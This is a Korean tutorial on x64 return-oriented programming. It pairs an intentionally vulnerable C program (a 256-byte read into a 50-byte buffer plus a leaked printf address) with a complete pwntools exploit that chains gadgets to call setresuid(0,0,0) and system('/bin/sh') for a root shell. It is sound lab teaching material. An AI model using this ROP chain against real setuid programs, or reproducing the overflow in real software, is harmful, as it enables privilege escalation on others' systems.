# ROP(Return Oriented Programming) - x64

- ROP(x86) 에서 정리한 이론과 동일하다. 따라서 바로 실습을 할 예정이다.



## Proof of concept

### Code

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 256);
}
 
void main(){
    seteuid(getuid());
    write(1,"Hello ROP\n",10);
    vuln();
}
```



### Build & Permission

![image](https://user-images.githubusercontent.com/59410565/119099930-62a50a80-ba52-11eb-8c44-5ddf3c4db03b.png)



### Overflow

![image](https://user-images.githubusercontent.com/59410565/119100048-823c3300-ba52-11eb-8927-dedfbf42bcf7.png)

**[Break Point]**

- vuln+0 : vuln 함수 코드 첫 부분
- vuln+68 : read() 함수 호출 전

![image](https://user-images.githubusercontent.com/59410565/119100338-cdeedc80-ba52-11eb-821a-6fd89c716116.png)

![image](https://user-images.githubusercontent.com/59410565/119100528-01316b80-ba53-11eb-8530-a9739248ec35.png)

![image](https://user-images.githubusercontent.com/59410565/119100565-0bec0080-ba53-11eb-8dd2-3c75d76e9ea4.png)

- Return address(0x7ffd9dab8c10) - buf 변수의 시작 주소(0x7ffd9dab8c10) = 72
- 즉, 72개 이상의 문자를 입력함으로써, Return address 영역을 변조할 수 있다.



## Exploit

#### Exploit 순서

1. setresuid 함수를 이용해 권한을 root(0)으로 변경
2. system 함수를 이용해 "/bin/sh" 실행

```python
setresuid(0, 0, 0)
system(binsh)
```



#### Payload를 구성하는데 필요한 정보

1. "/bin/sh" 문자열이 저장된 영역
2. libc offset 
   - printf
   -  system
   -  setresuid
3. 가젯의 위치
   - pop rdi, ret
   - pop rsi, ret
   - pop rdx, ret



### Find the Libc address of the "/bin/sh"

![image](https://user-images.githubusercontent.com/59410565/119102958-933a7380-ba55-11eb-863f-09df26685245.png)

![image](https://user-images.githubusercontent.com/59410565/119103024-a9483400-ba55-11eb-9c59-f5c7874a964b.png)

- 즉, "/bin/sh"의 offset은 0x18ce57이다.



### Get offset of printf, system, setresuid function

![image](https://user-images.githubusercontent.com/59410565/119103255-e6acc180-ba55-11eb-83da-1073c9f5889a.png)

- printf offset : 0x55810
- system offset : 0x453a0
- setresuid offset : 0xcd5f0



### Find gadget

> find gadgets
>
> > ROPgadget

![image](https://user-images.githubusercontent.com/59410565/119109467-27a7d480-ba5c-11eb-9b45-5c3dcd10f23c.png)

- pop rdi; ret : 0x00400843
- pop rsi; ret : 0x00400841
- rdx는 찾지 못하였다. 이런 경우 libc 파일에서 gadgets을 찾아 활용할 수 있다.

> find "pop rdx"
>
> > rp++

![image](https://user-images.githubusercontent.com/59410565/119103576-4c00b280-ba56-11eb-9d6c-26bb4e81df80.png)

- 해당 Exploit code에서는 0x001151c9 영역에 "pop rdx; pop rsi; ret;" 코드를 사용할 것이다. 



### Exploit Code

```python
from pwn import *
from struct import *
 
#context.log_level = 'debug'
 
#64bit OS - /lib/x86_64-linux-gnu/libc-2.23.so
libcbase_printf_offset = 0x55810
libcbase_system_offset = 0x453a0
libcbase_setresuid_offset = 0xcd5f0
 
binsh_offset = 0x18ce57
  
pop_rdi_ret = 0x00400843
pop_rsi_ret = 0x00400841
pop_rdx_ret_offset = 0x001151c9 
 
r = process('./rop')
 
r.recvn(10)
r.recvuntil('Printf() address : ')
libcbase = int(r.recvuntil('\n'),16)
libcbase -= libcbase_printf_offset
 
payload = "A"*72
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(libcbase + pop_rdx_ret_offset)
payload += p64(0)
payload += p64(0)
payload += p64(libcbase + libcbase_setresuid_offset)
 
payload += p64(pop_rdi_ret)
payload += p64(libcbase + binsh_offset)
payload += p64(libcbase + libcbase_system_offset)
 
r.send(payload)

r.interactive()
```



### Result

![image](https://user-images.githubusercontent.com/59410565/119110172-d2b88e00-ba5c-11eb-81e8-bd92ec4e1261.png)

